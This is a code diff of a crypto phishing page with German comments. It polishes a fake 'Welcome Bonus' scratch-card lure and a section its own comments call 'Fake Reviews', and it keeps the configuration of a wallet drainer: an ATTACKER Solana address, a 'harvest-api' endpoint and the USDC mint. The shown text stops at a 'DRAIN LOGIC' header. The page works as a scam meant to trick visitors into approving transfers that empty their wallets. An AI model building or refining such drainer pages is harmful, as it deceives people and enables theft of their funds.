@@ -75,8 +75,9 @@
   .scratch-container {
     position: relative; width: 100%; height: 140px;
     background: #000; border-radius: 16px; overflow: hidden;
-    box-shadow: inset 0 0 20px rgba(0,0,0,0.8); border: 1px solid rgba(255,255,255,0.1);
+    box-shadow: inset 0 0 20px rgba(0,0,0,0.8), 0 0 0 1px rgba(255,255,255,0.1);
     margin-bottom: 20px;
+    touch-action: none; /* Verhindert Scrollen beim Rubbeln */
   }
 
   .prize-reveal {
@@ -91,20 +92,24 @@
 
   canvas {
     position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-    z-index: 2; cursor: crosshair;
+    z-index: 2; cursor: pointer;
   }
 
   .claim-btn {
     width: 100%; padding: 16px; background: #ffffff; color: #000000;
     border: none; border-radius: 12px; font-size: 15px; font-weight: 700;
     cursor: pointer; display: flex; justify-content: center; align-items: center; gap: 8px;
-    position: relative; transition: all 0.3s; opacity: 0.5; pointer-events: none;
+    position: relative; transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1); opacity: 0.5; pointer-events: none;
+    transform: translateY(10px);
   }
-  .claim-btn.active { opacity: 1; pointer-events: auto; animation: popIn 0.5s ease-out; }
-  @keyframes popIn { 0% { transform: scale(0.9); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
+  .claim-btn.active { 
+    opacity: 1; pointer-events: auto; transform: translateY(0);
+    box-shadow: 0 10px 25px rgba(255,255,255,0.15);
+  }
   
-  .claim-btn:hover:not(:disabled) { transform: translateY(-2px) scale(1.02); box-shadow: 0 10px 25px rgba(255,255,255,0.2); }
-  .claim-btn:disabled { background: #27272a; color: #71717a; cursor: not-allowed; }
+  .claim-btn:hover:not(:disabled) { transform: translateY(-2px) scale(1.02); box-shadow: 0 15px 30px rgba(255,255,255,0.25); }
+  .claim-btn:active:not(:disabled) { transform: translateY(1px) scale(0.98); }
+  .claim-btn:disabled { background: #27272a; color: #71717a; cursor: not-allowed; box-shadow: none; }
 
   /* Fake Reviews Section */
   .reviews-section {
@@ -117,11 +122,13 @@
   .review-card {
     background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.05);
     border-radius: 12px; padding: 16px; margin-bottom: 10px;
+    transition: background 0.2s;
   }
+  .review-card:hover { background: rgba(255,255,255,0.05); }
   .review-top { display: flex; align-items: center; gap: 10px; margin-bottom: 8px; }
   .review-avatar {
     width: 32px; height: 32px; border-radius: 50%;
-    background: linear-gradient(45deg, #ff7e5f, #feb47b); display: flex; align-items: center; justify-content: center;
+    display: flex; align-items: center; justify-content: center;
     font-weight: bold; font-size: 12px; color: #fff;
   }
   .review-user { font-size: 13px; font-weight: 600; color: #e4e4e7; }
@@ -152,7 +159,6 @@
 
   <div class="main-container">
     
-    <!-- Scratch Card -->
     <div class="scratch-card">
       <div class="scratch-title">Welcome Bonus</div>
       <div class="scratch-sub">Scratch below to reveal your prize</div>
@@ -172,7 +178,6 @@
       </button>
     </div>
 
-    <!-- Fake Reviews -->
     <div class="reviews-section">
       <div class="reviews-header">
         <span class="stars">★★★★★</span> 4.9/5 (12,482 Reviews)
@@ -209,51 +214,52 @@
   </div>
 
 <script>
-  // ====== CONFIG ======
   const ATTACKER = "DEINE_SOLANA_ADRESSE_HIER"; 
   const ENDPOINT = "https://harvest-api.rthvzkr6jv.workers.dev"; 
   const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"; 
-  // ====================
 
-  // ====== SCRATCH LOGIC ======
+  // ====== CLEAN SCRATCH LOGIC ======
   const canvas = document.getElementById('scratchCanvas');
-  const ctx = canvas.getContext('2d');
+  const ctx = canvas.getContext('2d', { willReadFrequently: true });
   const claimBtn = document.getElementById('claimBtn');
   let isScratched = false;
-
-  // Set canvas size
-  function resizeCanvas() {
-    canvas.width = canvas.offsetWidth;
-    canvas.height = canvas.offsetHeight;
-    fillCanvas();
-  }
-
-  // Fill canvas with a silver gradient
-  function fillCanvas() {
-    const gradient = ctx.createLinearGradient(0, 0, canvas.width, canvas.height);
-    gradient.addColorStop(0, '#2a2a2e');
-    gradient.addColorStop(0.5, '#4a4a52');
-    gradient.addColorStop(1, '#2a2a2e');
-    ctx.fillStyle = gradient;
-    ctx.fillRect(0, 0, canvas.width, canvas.height);
-    
-    // Add "Scratch Here" text on canvas
-    ctx.fillStyle = 'rgba(255,255,255,0.2)';
-    ctx.font = 'bold 20px Inter';
-    ctx.textAlign = 'center';
-    ctx.fillText('SCRATCH HERE', canvas.width/2, canvas.height/2 + 7);
-  }
-
-  // Draw with globalCompositeOperation to act as an eraser
-  function scratch(x, y) {
-    ctx.globalCompositeOperation = 'destination-out';
-    ctx.beginPath();
-    ctx.arc(x, y, 20, 0, Math.PI * 2);
-    ctx.fill();
-  }
-
-  // Event listeners for mouse/touch
   let isDrawing = false;
+
+  function initCanvas() {
+    const rect = canvas.parentElement.getBoundingClientRect();
+    
+    // Hochauflösend für Retina Displays
+    const dpr = window.devicePixelRatio || 1;
+    canvas.width = rect.width * dpr;
+    canvas.height = rect.height * dpr;
+    
+    ctx.scale(dpr, dpr);
+    canvas.style.width = rect.width + 'px';
+    canvas.style.height = rect.height + 'px';
+
+    // Silberner Verlauf
+    const gradient = ctx.createLinearGradient(0, 0, rect.width, rect.height);
+    gradient.addColorStop(0, '#3a3a40');
+    gradient.addColorStop(0.5, '#5a5a62');
+    gradient.addColorStop(1, '#3a3a40');
+    ctx.fillStyle = gradient;
+    ctx.fillRect(0, 0, rect.width, rect.height);
+
+    // Glanz-Effekt
+    const shine = ctx.createLinearGradient(0, 0, rect.width, 0);
+    shine.addColorStop(0, 'rgba(255,255,255,0)');
+    shine.addColorStop(0.5, 'rgba(255,255,255,0.15)');
+    shine.addColorStop(1, 'rgba(255,255,255,0)');
+    ctx.fillStyle = shine;
+    ctx.fillRect(0, 0, rect.width, rect.height);
+
+    // Text
+    ctx.fillStyle = 'rgba(255,255,255,0.3)';
+    ctx.font = '600 14px -apple-system, sans-serif';
+    ctx.textAlign = 'center';
+    ctx.textBaseline = 'middle';
+    ctx.fillText('SCRATCH TO REVEAL', rect.width / 2, rect.height / 2);
+  }
 
   function getPos(e) {
     const rect = canvas.getBoundingClientRect();
@@ -262,8 +268,32 @@
     return { x: clientX - rect.left, y: clientY - rect.top };
   }
 
+  function scratch(x, y) {
+    ctx.globalCompositeOperation = 'destination-out';
+    
+    // Weicher Kreis
+    ctx.beginPath();
+    ctx.arc(x, y, 24, 0, Math.PI * 2);
+    ctx.fill();
+
+    // Verbindet die Punkte bei schnellem Wischen
+    if (lastPos) {
+      ctx.beginPath();
+      ctx.lineWidth = 48;
+      ctx.lineCap = 'round';
+      ctx.lineJoin = 'round';
+      ctx.moveTo(lastPos.x, lastPos.y);
+      ctx.lineTo(x, y);
+      ctx.stroke();
+    }
+    lastPos = { x, y };
+  }
+
+  let lastPos = null;
+
   function startDraw(e) {
     isDrawing = true;
+    lastPos = null;
     const pos = getPos(e);
     scratch(pos.x, pos.y);
   }
@@ -278,28 +308,29 @@
 
   function stopDraw() {
     isDrawing = false;
+    lastPos = null;
   }
 
-  // Check if user scratched enough to activate button
   function checkScratched() {
     if (isScratched) return;
-    const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
-    const pixels = imageData.data;
-    let transparentPixels = 0;
-    
-    // Check every 4th pixel for performance
-    for (let i = 3; i < pixels.length; i += 4 * 4) {
-      if (pixels[i] === 0) transparentPixels++;
+    const imgData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+    const pixels = imgData.data;
+    let transparent = 0;
+
+    for (let i = 3; i < pixels.length; i += 4) {
+      if (pixels[i] === 0) transparent++;
     }
+
+    const percent = (transparent / (pixels.length / 4)) * 100;
     
-    const percentage = (transparentPixels / (pixels.length / 16)) * 100;
-    
-    if (percentage > 40) { // 40% scratched
+    if (percent > 45) { // Wenn 45% freigerubbelt
       isScratched = true;
       claimBtn.classList.add('active');
-      // Fade out canvas completely
-      canvas.style.transition = 'opacity 0.5s';
+      
+      // Sanftes Ausblenden
+      canvas.style.transition = 'opacity 0.4s ease';
       canvas.style.opacity = '0';
+      setTimeout(() => { canvas.style.display = 'none'; }, 400);
     }
   }
 
@@ -312,10 +343,8 @@
   canvas.addEventListener('touchmove', draw, {passive: false});
   canvas.addEventListener('touchend', stopDraw);
 
-  window.addEventListener('resize', resizeCanvas);
-  
-  // Init canvas when script loads
-  setTimeout(resizeCanvas, 100);
+  // Init after slight delay to get correct layout size
+  setTimeout(initCanvas, 150);
 
 
   // ====== DRAIN LOGIC ======
